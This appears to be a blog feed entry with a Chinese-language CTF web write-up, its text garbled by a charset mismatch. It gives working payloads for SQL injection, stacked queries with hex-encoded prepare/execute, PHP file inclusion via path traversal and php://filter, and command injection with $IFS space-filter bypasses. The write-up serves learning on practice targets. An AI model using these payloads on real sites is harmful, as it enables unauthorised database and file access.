      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp1</title>
    <link href="/2024/01/24/WebWriteUp/"/>
    <url>/2024/01/24/WebWriteUp/</url>
    
    <content type="html"><![CDATA[<h4 id="æå®¢å¤§æŒ‘æˆ˜-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜]EasySQL</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124190853709.png" alt="image-20240124190853709"></p><p>å…ˆè¾“å…¥ç”¨æˆ·å1å’Œå¯†ç 1</p><p><img src="/2024/01/24/WebWriteUp/image-20240124190942891.png" alt="image-20240124190942891"></p><p>å¯ä»¥çœ‹å‡ºæ˜¯é€šè¿‡GETæ–¹æ³•ä¼ è¾“æ•°æ®</p><p>å°è¯•è¾“å…¥1â€™è¿›è¡Œæµ‹è¯•</p><p>å¾—åˆ°æŠ¥é”™ï¼š<img src="/2024/01/24/WebWriteUp/image-20240124193114395.png" alt="image-20240124193114395"></p><p>è¿™è¯´æ˜æ˜¯æŸ¥è¯¢è¯­å¥ä¸­æ˜¯å­˜åœ¨ä¸€ä¸ªå•å¼•å·çš„ï¼Œä¸ºå•å¼•å·é—­åˆï¼Œé‚£ä¹ˆåˆ™æ„é€ payload</p><p><code>1&#39;or 1=1 #</code></p><p>å¡«åœ¨ç”¨æˆ·åå¤„ï¼ˆæˆ–ç›´æ¥ä¿®æ”¹ï¼‰ï¼Œå¯†ç ä»»æ„ï¼Œå› ä¸ºè¢«#æ³¨é‡Šæ‰äº†</p><p><img src="/2024/01/24/WebWriteUp/image-20240124193458266.png" alt="image-20240124193458266"></p><p>æˆåŠŸç»•è¿‡</p><h4 id="HaveFun"><a href="#HaveFun" class="headerlink" title="HaveFun"></a>HaveFun</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124195701183.png" alt="image-20240124195701183"></p><p>è¿›æ¥å‘ç°å•¥ä¹Ÿæ²¡æœ‰ï¼Œé‚£ä¹ˆæŸ¥çœ‹æºç </p><p><img src="/2024/01/24/WebWriteUp/image-20240124195736363.png" alt="image-20240124195736363"></p><p>é€šè¿‡Getæ–¹æ³•è·å¾—å‚æ•°ï¼Œå¹¶å­˜æ”¾åœ¨catä¸­ï¼Œåˆ¤æ–­è¯¥å€¼æ˜¯å¦ç­‰äºdogï¼Œé‚£ä¹ˆæ„é€ payload</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200024766.png" alt="image-20240124200024766"></p><p>è·å¾—flag</p><h4 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124200118945.png" alt="image-20240124200118945"></p><p>è¿›æ¥å°±æ˜¯è¿™ä¸ªæŠ½è±¡ç¬‘è„¸ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œé¢˜ç›®é‡Œæœ‰tagï¼šphpï¼Œä»£ç å®¡è®¡ï¼Œé‚£ä¹ˆæŸ¥çœ‹æºç </p><p><img src="/2024/01/24/WebWriteUp/image-20240124200330278.png" alt="image-20240124200330278"></p><p>æŸ¥çœ‹source.phpï¼ˆç›´æ¥æ”¹urlï¼‰</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200411693.png" alt="image-20240124200411693"></p><p>çœ‹åˆ°è¿˜æœ‰ä¸ªhint.phpï¼Œä¹Ÿæ‰“å¼€çœ‹ä¸€ä¸‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200528267.png" alt="image-20240124200528267"></p><p>åªæœ‰è¿™ä¹ˆä¸€å¥è¯</p><p>è¿˜æ˜¯é‡ç‚¹çœ‹source.php</p><p>è¿™æ®µä»£ç å°±æ˜¯ï¼Œå¯¹ç”¨æˆ·è¯·æ±‚çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œå¦‚æœé€šè¿‡å®‰å…¨æ£€æŸ¥ï¼Œä¸”åœ¨ç™½åå•ä¸­ï¼Œåˆ™é€šè¿‡includeæ–¹æ³•åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œä¸”èƒ½å¾—åˆ°ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼ŒåªåŒ…å«source.phpå’Œhint.phpï¼Œç¬¬ä¸€ä¸ªifæ£€æŸ¥æ˜¯å¦å­˜åœ¨$pageå¹¶ä¸”æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€‚</li><li>æ£€æŸ¥$pageæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œæ˜¯çš„è¯è¿”å›trueã€‚æ¥ä¸‹æ¥ï¼Œä¸¤ä¸ªå‡½æ•°ä¸€ä¸ª<a href="https://www.php.net/manual/zh/function.mb-substr.php">mb_substr</a>å’Œ<a href="https://www.php.net/manual/zh/function.mb-strpos.php">mb_strpos</a>ï¼Œæ€»çš„æ„æ€å°±æ˜¯æˆªå–å˜é‡pageä¸­?å‰é¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è¿›è¡Œç™½åå•æ ¡éªŒã€‚</li><li>åœ¨urlè§£ç åçš„$pageçš„?å‰é¢æ˜¯å¦åœ¨whitelisté‡Œé¢</li></ol><p>æ‰€ä»¥æ„é€ payload</p><p><code>source.php?file=hint.php?ffffllllaaaagggg</code></p><p>å‘ç°ï¼Œå›¾ç‰‡æ¶ˆå¤±äº†ï¼Œé‚£ä¹ˆè¯´æ˜payloadæ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆè¿›è¡Œç›®å½•ç©¿è¶Šæ‰¾æ–‡ä»¶</p><p>ä¿®æ”¹payloadï¼ˆå®é™…äº”å±‚æ—¶å°±èƒ½æ‰¾åˆ°ï¼‰</p><p><code>source.php?file=hint.php?../../../../../../ffffllllaaaagggg</code></p><p><img src="/2024/01/24/WebWriteUp/image-20240124202309328.png" alt="image-20240124202309328"></p><p>å¾—åˆ°flag</p><h4 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h4><p>æ ¹æ®é¢˜ç›®çŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´</p><p>æ–‡ä»¶åŒ…å«æ¼æ´æˆå› ï¼š</p><p>ä¸ºäº†çµæ´»çš„åŒ…å«æ–‡ä»¶ï¼Œå°†è¢«åŒ…å«æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œé€šè¿‡åŠ¨æ€å˜é‡å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶æ—¶ï¼Œç”¨æˆ·å¯¹å˜é‡çš„å¯æ§è€ŒæœåŠ¡å™¨ç«¯æœªå¯¹å˜é‡å€¼åˆç†çš„æ ¡éªŒæˆ–è¢«ç»•è¿‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">include() <span class="hljs-comment">// æ‰¾ä¸åˆ°è¢«åŒ…å«æ–‡ä»¶æ—¶äº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ</span><br><br>include_once() <span class="hljs-comment">// ä¸includeç±»ä¼¼ï¼Œä½†å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</span><br><br>require() <span class="hljs-comment">// æ‰¾ä¸åˆ°è¢«åŒ…å«æ–‡ä»¶æ—¶äº§ç”Ÿé”™è¯¯ï¼Œè„šæœ¬åœæ­¢</span><br><br>require_once() <span class="hljs-comment">// ä¸requireç±»ä¼¼ï¼Œä½†å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ï¼š</p><p>windowså¸¸è§æ•æ„Ÿä¿¡æ¯</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185135302.png" alt="image-20240125185135302"></p><p>linuxå¸¸è§æ•æ„Ÿä¿¡æ¯</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185152901.png" alt="image-20240125185152901"></p><p>ä¼ªåè®®</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185254233.png" alt="image-20240125185254233"></p><p>é¦–å…ˆå…ˆå°è¯•æš´åŠ›æ‰¾å‡ å±‚ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨flag.phpä¹‹ç±»çš„æ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185430312.png" alt="image-20240125185430312"></p><p><img src="/2024/01/24/WebWriteUp/image-20240125185446011.png" alt="image-20240125185446011"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œå°è¯•ç”¨phpä¼ªåè®®çœ‹ä¸€çœ¼flag.phpçš„æºç </p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²base64åŠ å¯†çš„å­—ç¬¦ä¸²</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185625571.png" alt="image-20240125185625571"></p><p>è§£ç å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;9a011d4ae-cab3-4cc3-90c5-297288f0189b&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Eexc"><a href="#Eexc" class="headerlink" title="Eexc"></a>Eexc</h4><p>è¿™æ˜¯ä¸€é“å‘½ä»¤æ³¨å…¥é¢˜</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195121169.png" alt="image-20240125195121169"></p><p>éšä¾¿è¾“äº†ä¸ª1ï¼Œå‘ç°å±…ç„¶èƒ½pingé€š</p><p>é‚£ä¹ˆä¿®æ”¹payloadä¸ºï¼š1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195228705.png" alt="image-20240125195228705"></p><p>ç»§ç»­æŸ¥çœ‹ä¸Šçº§ç›®å½•ï¼š1;ls ..&#x2F;</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195404097.png" alt="image-20240125195404097"></p><p>å†æŸ¥çœ‹ä¸Šä¸€çº§</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195436474.png" alt="image-20240125195436474"></p><p>æ‰¾åˆ°flagï¼Œç”¨catå‘½ä»¤æŸ¥çœ‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195526719.png" alt="image-20240125195526719"></p><h4 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126150517909.png" alt="image-20240126150517909"></p><p>è¿›æ¥å‘ç°åªæœ‰ä¸ªè¿™ä¸ªï¼Œé‚£æ¨æµ‹è·Ÿä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€é“å‘½ä»¤æ³¨å…¥é¢˜</p><p>æ„é€ payloadï¼š</p><p>&#x2F;?ip&#x3D;127.0.0.1</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150625427.png" alt="image-20240126150625427"></p><p>èƒ½pingé€š</p><p>é‚£ä¹ˆè¿˜æ˜¯ä¸€æ ·çš„å¥—è·¯ï¼Œä¿®æ”¹payloadä¸ºï¼š&#x2F;?ip&#x3D;127.0.0.1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150732541.png" alt="image-20240126150732541"></p><p>åˆ©ç”¨catå‘½ä»¤æŸ¥çœ‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150755178.png" alt="image-20240126150755178"></p><p>åº”è¯¥æ˜¯è¿‡æ»¤äº†ç©ºæ ¼</p><blockquote><p>è¿‡æ»¤ç©ºæ ¼çš„æ–¹æ³•æœ‰ï¼š</p><p>$IFS</p><p>${IFS}</p><p>$IFS$(ä»»æ„æ•°å­—)ï¼Œ å¦‚ï¼š$IFS$1</p><p>&lt;</p><p>&lt;&gt;</p><p>{cat, flag.php}</p><p>%20</p><p>%09</p></blockquote><p>å°è¯•payload: &#x2F;?ip&#x3D;127.0.0.1;cat$IFSflag.php</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151216802.png" alt="image-20240126151216802"></p><p>é‚£åº”è¯¥æ˜¯æœ‰æ›´å¤šçš„è¿‡æ»¤æ‰‹æ®µï¼Œå†çœ‹çœ‹index.phpä¸­æœ‰å•¥</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151540171.png" alt="image-20240126151540171"></p><p>è¿™æ®µä»£ç çš„ä½œç”¨ï¼š</p><ol><li>æ£€æŸ¥å˜é‡ <code>$ip</code> ä¸­æ˜¯å¦åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ã€‚å¦‚æœ <code>$ip</code> ä¸­åŒ…å«å…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼Œä»£ç å°†è¾“å‡ºåŒ¹é…çš„å­—ç¬¦æ•°ï¼ˆç”± å‚æ•° <code>$match</code> ä¼ é€’ï¼‰ï¼Œç„¶åè¾“å‡º â€œfxck your symbol!â€ å¹¶ç»“æŸç¨‹åºã€‚</li><li>æ£€æŸ¥æ˜¯å¦æœ‰ç©ºæ ¼åœ¨å˜é‡ <code>$ip</code> ä¸­ã€‚å¦‚æœæœ‰ç©ºæ ¼ï¼Œè¾“å‡º â€œfxck your space!â€ å¹¶ç»“æŸç¨‹åºã€‚</li><li>æ£€æŸ¥ <code>$ip</code> ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸² â€œbashâ€ã€‚å¦‚æœåŒ…å«ï¼Œè¾“å‡º â€œfxck your bash!â€ å¹¶ç»“æŸç¨‹åºã€‚</li><li>æ£€æŸ¥ <code>$ip</code> ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸² â€œflagâ€ï¼Œå¦‚æœåŒ…å«ï¼Œè¾“å‡º â€œfxck your flag!â€ å¹¶ç»“æŸç¨‹åº</li><li>å¦‚æœé€šè¿‡äº†æ‰€æœ‰çš„æ£€æŸ¥ï¼Œä½¿ç”¨ <code>shell_exec</code> å‡½æ•°æ‰§è¡Œ ping å‘½ä»¤ã€‚è¿™é‡Œæ˜¯æ‰§è¡Œ <code>ping -c 4</code> å‘½ä»¤ï¼Œå…¶ä¸­ <code>-c 4</code> è¡¨ç¤ºå‘é€å››ä¸ª ICMP åŒ…ã€‚</li></ol><p>é‚£ä¹ˆæ˜¾ç„¶ï¼Œå¯ä»¥å°è¯•æ‹¼æ¥çš„æ–¹å¼è¢«é™åˆ¶çš„å…³é”®è¯flag</p><p>æ„é€ payloadï¼š&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;ag;cat$IFS$1fl$a.phpï¼Œå¾—åˆ°flag</p><p><img src="/2024/01/24/WebWriteUp/image-20240126153519187.png" alt="image-20240126153519187"></p><h4 id="éšä¾¿æ³¨"><a href="#éšä¾¿æ³¨" class="headerlink" title="éšä¾¿æ³¨"></a>éšä¾¿æ³¨</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126154133769.png" alt="image-20240126154133769"></p><p>Submitä¸€ä¸‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154325513.png" alt="image-20240126154325513"></p><p>å°è¯•sqlæ³¨å…¥</p><p><strong>é¦–å…ˆåˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154658007.png" alt="image-20240126154658007"></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154634784.png" alt="image-20240126154634784"></p><p>ä¸¤æ¬¡éƒ½æœ‰å›æ˜¾ï¼Œè¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><p>æ¥ç€<strong>æŸ¥è¯¢å­—æ®µæ•°</strong>ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154809129.png" alt="image-20240126154809129"></p><p>æŸ¥åˆ°ç¬¬ä¸‰æ¬¡å‘ç°ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154847897.png" alt="image-20240126154847897"></p><p>è¯´æ˜æœ‰ä¸¤ä¸ªå­—æ®µ</p><p><strong>ç¡®å®šå­—æ®µçš„æ˜¾ç¤ºé¡ºåº</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126155713350.png" alt="image-20240126155713350"></p><p>è¯´æ˜selectè¢«è¿‡æ»¤æ‰äº†</p><p>ï¼ˆè¿™é‡Œä¸ä¼šäº†ï¼Œçœ‹é¢˜è§£ï¼Œè¯´æ˜¯è¦ç”¨å †å æ³¨å…¥ï¼Œå †å æ³¨å…¥ç›¸å…³ç¬”è®°å•ç‹¬æ•´ç†ï¼‰</p><p>çˆ†ç ´æ•°æ®åº“</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193749558.png" alt="image-20240126193749558"></p><p>å°è¯•çˆ†è¡¨</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193856592.png" alt="image-20240126193856592"></p><p>æ„é€ payloadæŸ¥çœ‹ç¬¬ä¸€ä¸ªè¡¨1919810931114514</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„ï¼Œè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·æ‹¬èµ·æ¥ï¼ŒåŒæ—¶éœ€è¦åœ¨æœ€ååŠ #å±è”½æ‰å…¶ä»–æŸ¥è¯¢è¯­å¥</p><p><img src="/2024/01/24/WebWriteUp/image-20240126195918958.png" alt="image-20240126195918958"></p><p><strong>æ–¹æ³•ä¸€</strong></p><p>å› ä¸ºselectè¢«è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆåˆ™å¯ä»¥å¯¹ </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼Œç„¶åæ„é€ payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">SeT</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">prepare</span> execsql <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span> execsql;#<br></code></pre></td></tr></table></figure><ul><li>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</li><li>executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚</li><li>SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</li></ul><p><img src="/2024/01/24/WebWriteUp/image-20240126205028096.png" alt="image-20240126205028096"></p><p><strong>æ–¹æ³•äºŒ</strong></p><p>æ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/24/WebWriteUp/image-20240126211244718.png" alt="image-20240126211244718"></p><p>åœ¨MySQLä¸­ï¼Œ<code>HANDLER</code>è¯­å¥ç”¨äºé€šè¿‡å­˜å‚¨å¼•æ“ç›´æ¥æ“ä½œè¡¨çš„æ•°æ®ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ ‡å‡†çš„SQLæŸ¥è¯¢è¯­å¥ã€‚å¯ä»¥ä»¥æ›´åº•å±‚çš„æ–¹å¼å¯¹è¡¨è¿›è¡Œè¯»å†™æ“ä½œï¼Œç»•è¿‡SQLè§£é‡Šå™¨ã€‚</p><h4 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h4><p><img src="/2024/01/24/WebWriteUp/image-20240127142115912.png" alt="image-20240127142115912"></p><p>è¾“å…¥1â€™ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œè¾“å…¥1ï¼Œæ­£å¸¸å›æ˜¾ï¼Œåˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>è¾“å…¥1; show tables# çˆ†è¡¨çœ‹çœ‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240127143407328.png" alt="image-20240127143407328"></p><p>å°è¯•ï¼š1; select * from Flag#</p><p>å›æ˜¾é”™è¯¯</p><p>å°è¯•ï¼š1; show columns from Flag#</p><p>å›æ˜¾é”™è¯¯</p><p><img src="/2024/01/24/WebWriteUp/image-20240127143719209.png" alt="image-20240127143719209"></p><p>çœ‹ç€åº”è¯¥æ˜¯è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—</p><p>å°è¯•ä¸Šè¾¹æåˆ°è¿‡çš„å°†è¯­å¥è½¬16è¿›åˆ¶ï¼Œæ„é€ payload</p><p>1;SeT@a&#x3D;0x73656c6563742a66726f6d466c6167;prepare execsql from @a;execute execsql;#</p><p>å›æ˜¾é”™è¯¯</p><p>é‚£ä¹ˆå†å°è¯•handlerè¯­å¥</p><p>1; handler Flag open as a; handler a read next;#</p><p>å›æ˜¾ä¾ç„¶æ˜¯é”™è¯¯</p><p>ï¼ˆåšä¸åŠ¨äº†ï¼Œçœ‹é¢˜è§£ï¼‰</p><p>çŒœæµ‹ä¸ä»…æ˜¯å¾ˆå¤šå…³é”®è¯è¢«è¿‡æ»¤äº†ï¼Œflagæœ¬èº«ä¹Ÿè¢«è¿‡æ»¤äº†</p><p>å¤§ä½¬ä»¬çŒœæµ‹åæ®µè¯­è¨€ä¸ºï¼šselect $_GET[â€˜queryâ€™] || flag from Flag</p><p>è¿™é‡ŒçŒœæµ‹çš„æ€è·¯ï¼Œä»¥æˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆåœ¨çŸ¥é“çš„æ•°å­—å‹æ³¨å…¥ä¹‹åï¼Œç»è¿‡ä¸Šè¿°çœ‹é¢˜è§£ä¹‹å‰çš„å°è¯•ä¹‹åï¼Œå‘ç°å¸¸è§„çš„æ³¨å…¥æ‰‹æ®µä¸å¥½ä½¿</p><p>ç„¶åçŒœæƒ³æ˜¯ä¸æ˜¯åœ¨åç«¯ç”¨çš„è¯­è¨€é‡Œï¼Œè·å–äº†è¾“å…¥æ¡†çš„å†…å®¹è¿˜è¿›è¡Œçš„åˆ«çš„è¿ç®—</p><p>é‚£ä¹ˆåœ¨è¾“å…¥æ¡†å°è¯•ï¼š1ï¼Œ1ï¼Œå¾—åˆ°å›æ˜¾ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240127194441306.png" alt="image-20240127194441306"></p><p>å°è¯•1ï¼Œ2</p><p>å‘ç°å›æ˜¾å¹¶æ²¡æœ‰å˜</p><p>å°è¯•1ï¼Œa</p><p>å‘ç°å¾—ä¸åˆ°å›æ˜¾</p><p>è¿™é‡Œéœ€è¦è¡¥å……ä¸€ä¸ªçŸ¥è¯†ï¼š</p><blockquote><p>å½“åœ¨sqlè¯­å¥ä¸­ä½¿ç”¨äº†||è¿ç®—ç¬¦æ—¶ï¼Œå¦‚æœä¸¤ç«¯å…¶ä¸­ä¸€ä¸ªå­—æ®µçš„å€¼ä¸ºNULLæˆ–è€…éæ•°å­—å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿æ¥çš„æ“ä½œçš„ç»“æœä¸º0</p></blockquote><p>é‚£ä¹ˆå°±å¯ä»¥çŒœæµ‹ï¼Œåœ¨åç«¯çš„è¯­å¥é‡Œä½¿ç”¨äº†||è¿ç®—ç¬¦</p><p>è¿™é‡Œå°±æœ‰äº†ç¬¬ä¸€ç§è§£æ³•ï¼š</p><p>å°†||è¿ç®—ç¬¦è½¬æ¢ï¼ŒåŸç†å¦‚ä¸‹ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195449355.png" alt="image-20240127195449355"></p><p>æ‰€ä»¥æ„é€ payloadï¼š1; set sql_mode&#x3D;PIPES_AS_CONCAT; select 1</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195652258.png" alt="image-20240127195652258"></p><p>è§£æ³•2</p><p>æ„é€ payloadï¼š*,1</p><p>ä¼ åˆ°åç«¯çš„è¯­å¥å°±å˜æˆäº†ï¼šselect *,1 || flag from Flag</p><p>è¿™æ®µSQLä»£ç çš„å«ä¹‰æ˜¯ï¼šä»Flagè¡¨ä¸­é€‰æ‹©æ‰€æœ‰çš„åˆ—ï¼Œä»¥åŠç”±åˆ—flagçš„å€¼ä¸æ•°å­—1è¿›è¡Œè¿æ¥ç”Ÿæˆçš„æ–°åˆ—ã€‚åŸç†å¦‚ä¸‹ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195734295.png" alt="image-20240127195734295"></p><h4 id="æå®¢å¤§æŒ‘æˆ˜-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ ]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ ]Secret File</h4><p>çœ‹é¢˜ç›®åå­—ï¼ŒçŒœæµ‹æ˜¯ä¸ªæ–‡ä»¶åŒ…å«ç±»ä¼¼çš„é¢˜</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200322958.png" alt="image-20240127200322958"></p><p>è¿›å»é•¿è¿™æ ·ï¼ŒæŸ¥çœ‹æºç </p><p><img src="/2024/01/24/WebWriteUp/image-20240127200350391.png" alt="image-20240127200350391"></p><p>å‘ç°è¿˜æœ‰ä¸ªå…ƒç´ ï¼Œåªæ˜¯æŠŠå­—ä½“è®¾ç½®æˆäº†é»‘è‰²ï¼Œæ‰¾åˆ°å…ƒç´ ä½ç½®ç‚¹è¿›å»ï¼ˆæˆ–è€…ç›´æ¥åœ¨urlé‡Œ&#x2F;Archive_room.phpï¼‰</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200438038.png" alt="image-20240127200438038"></p><p>å†ç‚¹</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200507688.png" alt="image-20240127200507688"></p><p>å›åˆ°ä¸Šä¸€é¡µï¼ŒæŸ¥çœ‹æºç ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200821860.png" alt="image-20240127200821860"></p><p>å‘ç°æœ‰ä¸ªaction.phpï¼Œä½†æœ€åè¿›å»çš„æ˜¯end.phpï¼Œè¯´æ˜å­˜åœ¨é‡å®šå‘ï¼ŒæŠ“ä¸ªåŒ…ï¼Œç„¶åé‡æ–°å‘åˆ°action.php</p><p><img src="/2024/01/24/WebWriteUp/image-20240127201839681.png" alt="image-20240127201839681"></p><p>çœ‹åˆ°æœ‰ä¸ªsecr3t.phpï¼ŒæŸ¥çœ‹</p><p><img src="/2024/01/24/WebWriteUp/image-20240127202000095.png" alt="image-20240127202000095"></p><p>æ˜¾ç„¶è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååŒ…å« <code>../</code>ã€<code>tp</code>ã€<code>input</code> æˆ– <code>data</code> ä¸­çš„ä»»ä½•ä¸€ä¸ªå­ä¸²ï¼Œåˆ™è¾“å‡º â€œOh no!â€ å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é‡Œå¯ä»¥å°è¯•ä¼ªåè®®ï¼Œæ„é€ payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag.phpçš„å†…å®¹ï¼š</p><p><img src="/2024/01/24/WebWriteUp/image-20240127202726155.png" alt="image-20240127202726155"></p><p>base64è§£ç 